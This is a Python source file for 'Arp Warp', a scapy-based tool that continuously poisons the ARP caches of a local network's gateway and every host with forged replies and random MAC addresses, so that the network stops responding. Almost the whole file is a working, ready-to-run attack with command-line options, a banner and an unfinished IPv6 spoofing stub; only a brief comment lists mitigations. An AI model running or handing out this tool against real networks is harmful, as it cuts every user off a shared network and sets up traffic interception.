import argparse
import logging
import ipaddress
from typing import List

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
# TODO must ifconfig
# TODO nmap elegantly
# TODO gateway auto
# TODO test on ipv6 at home
# TODO stats at first and then del lines output
# TODO refresh ipv6 scans for new devices
# TODO why only joannas iphone doesnt convert? (ans: fake mac? or: ans: diferent preflix)

# TODO note: just realized apple is using different MAC addr for every interface?

# TODO NEWEST: require kali -> ping6 -> gather hosts -> get gateway -> fake NS packets
# SOLUTION: simply ping and wait for response then
from scapy.all import *

conf.verb = 0

#   --------------------------------------------------------------------------------------------------------------------
#
#   Arp Warp attack - Continuously poison the ARP cache of all hosts on the connected network to make it unresponsive
#
#   Notes
#       * 
#
#   Mitigation
#       * Static ARP table
#       * Use IPv6
#
#   --------------------------------------------------------------------------------------------------------------------

banner = """
......_.........______........__.........____....
...../ \...____|    \ \....../ /___.____|    \...
..../   \.|  __|     \ \ /\ / /    |  __|     |..
.../ /.\ \| |  |  __/.\      /     | |..|  __/...
../_/...\_\_|..|_|.....\_/\_/.\____|_|..|_|......
"""


class ArpWarp:
    _DEL = f"{'=' * 49}"
    _P_TIMEOUT = 2
    _P_RETRY = 10

    _IPV6_MULTIC_ADDR = "ff02::1"
    _IPV6_LL_PREF = "fe80"
    _IPV6_LL_PREFLEN = 64

    def __init__(self, iface, cidr, s_time, gateway, spoof_ipv6nd):
        self.network_interface = iface
        self.arp_poison_interval = s_time

        conf.iface = self.network_interface
        self.cidr_ipv4 = cidr

        self.my_private_ip = get_if_addr(self.network_interface)
        self.my_mac = get_if_hwaddr(self.network_interface)
        self.my_private_ipv6 = self.mac2ipv6_ll(self.my_mac)

        self.subnet_ipv4 = self.my_private_ip.split(".")[:3]
        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/{self.cidr_ipv4}"

        self.gateway_ipv4 = gateway or self.get_gateway_ipv4(self.network_interface)
        self.gateway_mac = getmacbyip(self.gateway_ipv4)
        self.gateway_ipv6 = self.mac2ipv6_ll(self.gateway_mac)

        if not self.gateway_mac:
            raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ipv4}")

        print("- net iface" + self.network_interface.rjust(38))
        print("- sleep time" + str(self.arp_poison_interval).rjust(32) + "[sec]")
        print("- IPv4 subnet" + self.subnet_ipv4_sr.rjust(36))
        print("- IPv4 gateway" + self.gateway_ipv4.rjust(35))
        print("- IPv6 gateway" + self.gateway_ipv6.rjust(35))
        print("- spoof IPv6 ND" + str(spoof_ipv6nd).rjust(34))
        print(ArpWarp._DEL)

        self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
                           str(host_ip) != self.my_private_ip and str(host_ip) != self.gateway_ipv4]
        print(f"[*] Generated {len(self.host_ipv4s)} possible IPV4 hosts")
        self.spoof_ipv6nd = spoof_ipv6nd
        if self.spoof_ipv6nd:
            print(f"[*] IPv6 ND spoof is enabled, setting up...")
            self.host_ipv6s = self.get_all_hosts_ipv6()
            print(f"[*] Found {len(self.host_ipv6s)} IPv6 hosts")
            self.get_all_hosts_ipv6()

        self.abort = False

    def get_all_hosts_ipv6(self) -> List[str]:
        ipv6_hosts = list()
        print("[*] Pinging IPv6 subnet for hosts...")
        ping_output = subprocess.check_output(['ping6', '-I', self.network_interface,
                                               ArpWarp._IPV6_MULTIC_ADDR, "-c", "3"]).decode()
        for line in ping_output.splitlines():
            s_idx = line.find(ArpWarp._IPV6_LL_PREF)
            e_idx = line.find(f"%{self.network_interface}")
            if s_idx > 0 and e_idx > 0:
                host = line[s_idx:e_idx]
                if host not in ipv6_hosts:
                    ipv6_hosts.append(line[s_idx:e_idx])
        print("@", ipv6_hosts)
        print("!", self.gateway_ipv6)  # TODO check if this is in above
        return ipv6_hosts

    def poison_arp(self):
        """
        * poison the gateway arp cache with a spoofed mac address for every possible host
        * poison every possible host with a spoofed mac address for the gateway
        """
        for host_ip in self.host_ipv4s:
            # poison gateways's arp cache
            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ipv4)
            sendp(Ether() / arp_packet_gateway, iface=self.network_interface)

            # poison host's arp cache
            arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)

    def poison_ra(self):
        """
        * send every host a spoofed RA packet with a fake MAC, using the routers lladdr  # todo test
        * send the router a spoofed RN packet with a fake MAC, using each host's lladdr  # todo test
        """
        pass

    def get_ts_ms(self):
        return int(time.time() * 1_000)

    def start_attack(self):
        loop_count = 0
        print(ArpWarp._DEL)
        print("")
        print("")
        while not self.abort:
            try:
                now = self.get_ts_ms()
                loop_count += 1
                self.poison_arp()
                print(2 * "\x1b[1A\x1b[2K")
                print(f"[*] attacking" + f"cycle #{str(loop_count)} duration {self.get_ts_ms() - now}[ms]".rjust(36))
                time.sleep(self.arp_poison_interval)
            except Exception as exc:
                print(ArpWarp._DEL)
                print(f"[!] Exception caught -> {exc}")
                self.abort = True
            except KeyboardInterrupt:
                print(ArpWarp._DEL)
                print(f"[*] User requested to stop...")
                self.abort = True

    @staticmethod
    def mac2ipv6_ll(mac):
        m = hex(int(mac.translate(str.maketrans('', '', ' .:-')), 16) ^ 0x020000000000)[2:]
        return f'{ArpWarp._IPV6_LL_PREF}::%s:%sff:fe%s:%s' % (m[:4], m[4:6], m[6:8], m[8:12])

    @staticmethod
    def get_gateway_ipv4(iface):
        try:
            return [r[2] for r in conf.route.routes if r[3] == iface and r[2] != '0.0.0.0'][0]
        except Exception:
            raise Exception(f"[!] Unable to IPv4 gateway, try setting manually by passing (-g, --set-gateway)...")


if __name__ == "__main__":
    print(f"\n{banner}\nWritten by @flashnuke")
    print(ArpWarp._DEL)
    parser = argparse.ArgumentParser(description=f'Perform an ARP cache poison attack',
                                     usage=f"./{os.path.basename(__file__)} iface")
    parser.add_argument("-i", "--network-interface", dest='iface', type=str, metavar=(""),
                        help="the name of the network interface (from `ifconfig`, i.e -> 'eth0')",
                        required=True)

    parser.add_argument("-m", "--set-mask", dest='mask', type=int, metavar=(""), default=24,
                        help="set the mask range (default -> /24 which means 0-256",
                        required=False)

    parser.add_argument("-s", "--sleep-interval", dest='s_time', type=int, metavar=(""), default=1,
                        help="set the sleep time between each arp poison attempt (default -> 1[sec])",
                        required=False)

    parser.add_argument("-g", "--set-gateway", dest='gateway', type=str, metavar=(""), default=None,
                        help="set the gateway ip manually (defaults to x.x.x.1)",
                        required=False)

    parser.add_argument("-6", "--spoof-ipv6nd", dest='spoof_ipv6nd', action="store_true",
                        default=False, help="spoof IPv6 router discovery (disabled by default)", required=False)
    arguments = parser.parse_args()

    warper = ArpWarp(arguments.iface, arguments.mask, arguments.s_time, arguments.gateway, arguments.spoof_ipv6nd)
    warper.start_attack()
